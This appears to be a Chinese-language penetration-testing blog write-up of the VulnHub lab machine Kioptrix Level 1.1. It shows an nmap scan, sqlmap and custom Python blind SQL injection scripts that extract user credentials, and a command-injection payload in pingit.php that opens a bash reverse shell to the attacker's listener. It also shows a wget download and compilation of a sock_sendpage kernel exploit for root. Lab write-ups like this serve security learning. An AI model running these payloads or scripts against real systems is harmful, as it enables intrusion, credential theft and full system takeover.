---
title: VulnHub-Kioptrix Level 1.1
author: AmtuOrRF
date: 2022-03-16
categories: [vulnhub]
tags: [vulnhub]
---
*2022 年 3 月 16 日，星期三*
### Description
> 

### 目录
- nmap
- 使用 sqlmap 对登录页面进行注入攻击
- 后台存的命令执行漏洞,进行利用/反弹Shell
- Privilege Escalation(特权升级)



### nmap 扫描
```bash
# Nmap 7.91 scan initiated Wed Mar 16 04:41:50 2022 as: nmap -sC -sV -p- -oN nmap 172.16.1.138
Nmap scan report for 172.16.1.138
Host is up (0.0031s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            606/udp   status
|_  100024  1            609/tcp   status
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2022-03-16T05:32:36+00:00; -3h09m37s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
609/tcp  open  status     1 (RPC #100024)
631/tcp  open  ipp        CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql      MySQL (unauthorized)
MAC Address: 00:0C:29:D6:1F:E5 (VMware)

Host script results:
|_clock-skew: -3h09m37s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 16 04:42:13 2022 -- 1 IP address (1 host up) scanned in 22.62 seconds
```

先去看看我比较熟悉的 80 端口

访问 web 发现是一个 远程系统管理登录 页面.
这里我可以想到两种攻击方式。
1:  登录页面肯存在 sql 注入
2 :  一般后台登录用户名都为admin，可以尝试暴力破解密码

### 使用 sqlmap 对登录页面进行注入攻击
' or 1='1
可以使用万能用户 万能密码 登录成功

但是呢我们需要 利用sql注入查询数据库内容

```bash
sqlmap -u "http://172.16.1.138/index.php" --batch  --forms --risk 3
```

> --forms 对于一个页面的form表单中的数据进行注入测试
> --risk 加大测试等级 

输出结果，确认存在sql注入
```bash
Parameter: psw (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=nTdT&psw=-1424' OR 3522=3522 AND 'jYxS'='jYxS&btnLogin=Login

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
    Payload: uname=nTdT&psw=' AND 5438=BENCHMARK(5000000,MD5(0x6b777477)) AND 'KIwJ'='KIwJ&btnLogin=Login
---
do you want to exploit this SQL injection? [Y/n] Y
[07:33:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 4
web application technology: Apache 2.0.52, PHP 4.3.9
back-end DBMS: MySQL < 5.0.12
[07:33:56] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-03162022_0733am.csv'
[07:33:56] [WARNING] your sqlmap version is outdated

[*] ending @ 07:33:56 /2022-03-16/
```

查询数据库
```bash
sqlmap -u "http://172.16.1.138/index.php" --batch  --forms --risk 3 --dbs`
```
输出结果就一个数据库
```bash
available databases [1]:
[*] webapp
```

查询`webapp` 库里的表
```bash
sqlmap -u "http://172.16.1.138/index.php" --batch  --forms --risk 3 -D --tables
```
直接错误，可能是因为不存在 information_schema 数据库的原因
sqlmap 也对这种情况有相应对策，这里我不想展示怎么使用。

### 使用python编写注入脚本 
为了提高我编写自动化脚本的能力，我写了对应的脚本 进行解决

> 查询 webapp 数据库内有哪些表
```python
import requests

url = 'http://172.16.1.138/index.php'


def main(tables):
    payload = f"-1' or exists(select 1 from webapp.{tables}) or 2='2"
    data={
        'uname':'admin'
        ,'psw': payload
        ,'btnLogin':'Login'
        }
    v1 = requests.post(url=url,data=data).text
    if 'Ping a Machine on' in v1:
        print(tables)

with open('/usr/share/sqlmap/data/txt/common-columns.txt','r') as f:
    for l in f.readlines():
        main(l[:-1])
```

执行脚本
```bash
root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# python3 exp.py 
users
root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1#
```
获取了一个 users 表


> 想查询表的内容我们同样写个脚本跑一下(只需要把上面的脚本稍做修改)
> 查询users 表里有哪些字段
```python
import requests

url = 'http://172.16.1.138/index.php'


def main(columns):
    payload = f"-1' or exists(select {columns} from webapp.users) or 2='2"
    data={
        'uname':'admin'
        ,'psw': payload
        ,'btnLogin':'Login'
        }
    v1 = requests.post(url=url,data=data).text
    if 'Ping a Machine on' in v1:
        print(columns)

with open('/usr/share/sqlmap/data/txt/common-columns.txt','r') as f:
    for l in f.readlines():
        main(l[:-1])
```
脚本直接结果
```bash
oot@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# python3 exp.py 
id
username
password
```
获取了3个 字段 id,username,password

继续编写脚本查看字段所用内容 
> 查询 id,username,password 字段的内容脚本

```python
import requests

url = 'http://172.16.1.138/index.php'


def main():
    content = ''
    for i in range(1,200):
        low = 32
        high = 127
        mid = (low + high) // 2
        while(low < high):
            payload = f"' or ascii(substr((select group_concat(id,'-',username,'-',password) from users),{i},1))>{mid} and 1='1"
            data={
                'uname':'admin'
                ,'psw': payload
                ,'btnLogin':'Login'
                }
            v1 = requests.post(url=url,data=data).text
            if 'Ping a Machine on' in v1:
                low = mid + 1
            else:
                high = mid
            mid = (low + high)//2
        if mid == 127 or mid == 32:
            break
        content += chr(mid)
        print(content)
main()
```

执行结果
```bash
root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# python3 exp.py 
1
1-
1-a
1-ad
1-adm
1-admi
1-admin
1-admin-
1-admin-5
1-admin-5a
1-admin-5af
1-admin-5afa
1-admin-5afac
1-admin-5afac8
1-admin-5afac8d
1-admin-5afac8d8
1-admin-5afac8d85
1-admin-5afac8d85f
1-admin-5afac8d85f,
1-admin-5afac8d85f,2
1-admin-5afac8d85f,2-
1-admin-5afac8d85f,2-j
1-admin-5afac8d85f,2-jo
1-admin-5afac8d85f,2-joh
1-admin-5afac8d85f,2-john
1-admin-5afac8d85f,2-john-
1-admin-5afac8d85f,2-john-6
1-admin-5afac8d85f,2-john-66
1-admin-5afac8d85f,2-john-66l
1-admin-5afac8d85f,2-john-66la
1-admin-5afac8d85f,2-john-66laj
1-admin-5afac8d85f,2-john-66lajG
1-admin-5afac8d85f,2-john-66lajGG
1-admin-5afac8d85f,2-john-66lajGGb
1-admin-5afac8d85f,2-john-66lajGGbl
1-admin-5afac8d85f,2-john-66lajGGbla
root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1#
```

一共 2 个用户
`admin`:`5afac8d85f`
`john`:`66lajGGbla`
直接登录后台

### 后台存的命令执行漏洞,进行利用/反弹Shell
登录后，查看源代码
```html
<html>
<body>

<!-- Start of HTML when logged in as Administator -->
	<form name="ping" action="pingit.php" method="post" target="_blank">
		<table width='600' border='1'>
		<tr valign='middle'>
			<td colspan='2' align='center'>
			<b>Welcome to the Basic Administrative Web Console<br></b>
			</td>
		</tr>
		<tr valign='middle'>
			<td align='center'>
				Ping a Machine on the Network:
			</td>
				<td align='center>
				<input type="text" name="ip" size="30">
				<input type="submit" value="submit" name="submit">
			</td>
			</td>
		</tr>
	</table>
	</form>


</body>
</html>
```
发现可以对`pingit.php`进行 post 提交 ip,貌似是服务器对提交`ip`内容进行 ping 的操作

使用curl命令 对 pingit.php页面 发起 POST 请求，提交`ip=127.0.0.1&submit=submit`
```bash
root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# curl 'http://172.16.1.138/pingit.php' -XPOST -d 'ip=127.0.0.1&submit=submit'

127.0.0.1<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.016 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.012/0.015/0.019/0.005 ms, pipe 2
```
 等待返回结果，意料之中 
 
 接下来直接反弹shell
 
 kali nc 监听本地1234端口: ip `172.16.1.115`
 ```bash
 nc -lvp 1234
 ```
 
 然后新开个终端，使用`curl` 发送payload
 ```bash
 curl 'http://172.16.1.138/pingit.php' -XPOST -d 'ip=127.0.0.1|bash -i >%26 /dev/tcp/172.16.1.115/1234 0>%261&submit=submit'
 ```

然后监听的那边已经接受到一个shell了
```bash
root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# nc -lvp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 172.16.1.138.
Ncat: Connection from 172.16.1.138:32780.
bash: no job control in this shell
bash-3.00$ which python
/usr/bin/python
bash-3.00$ python -c "import pty;pty.spawn('/bin/bash')"
bash-3.00$ tty
tty
/dev/pts/0
bash-3.00$
```

`cat /etc/passwd |grep bin/bash` 发现 john 用户 ，刚刚在 数据库里也有个 john 还有密码
```bash
bash-3.00$ cat /etc/passwd |grep bin/bash
cat /etc/passwd |grep bin/bash
root:x:0:0:root:/root:/bin/bash
netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
john:x:500:500::/home/john:/bin/bash
harold:x:501:501::/home/harold:/bin/bash
bash-3.00$
```

尝试使用数据库里密码su 切换到用户john, 或者ssh登录

尝试的结果都失败

### Privilege Escalation(特权升级)
```bash
bash-3.00$ uname -a
uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux

bash-3.00$ cat /proc/version
Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007
```

使用 searchsploit 搜索潜在的本地漏洞
```bash
root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1# searchsploit 2.6 Linux Kernel Local Privilege Centos
------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                             |  Path
------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Escalati | linux/local/9545.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5)      | linux/local/9479.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)       | linux_x86/local/9542.c
Linux Kernel 2.6.32 < 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Privilege Escalation (1)                                                      | linux/local/25444.c
Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - 'Mutagen Astronomy' Local Privilege Escalation                     | linux_x86-64/local/45516.c
------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@CLw0rm:~/MyDoc/vulnhub/Kioptrix-1.1#
```

先尝试 第一个 `linux/local/9545.c`

KALI:
将`9545.c`拷贝到当前目录
`searchsploit -m linux/local/9545.c`

开启 http 服务，方便 靶机下载提取文件
`python3 -m http.server 81`


靶机:
```bash
$ cd /tmp

# 下载 提权文件
$ wget http://172.16.1.115:81/9545.c

# 看看编译说明
$ cat 9545.c |grep gcc
 * gcc -Wall -o linux-sendpage linux-sendpage.c
 * gcc -Wall -m64 -o linux-sendpage linux-sendpage.c

# 先修改下文件名
$ mv 9545.c linux-sendpage.c

# 使用上面第一条编译命令
$ gcc -Wall -o linux-sendpage linux-sendpage.c

```

执行文件，提权成功
```bash

$ ./linux-sendpage
sh-3.00# id
id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00# cd /root
cd /root
sh-3.00# ls
ls
anaconda-ks.cfg  install.log  install.log.syslog
sh-3.00# whoami
whoami
root
sh-3.00#
```

结束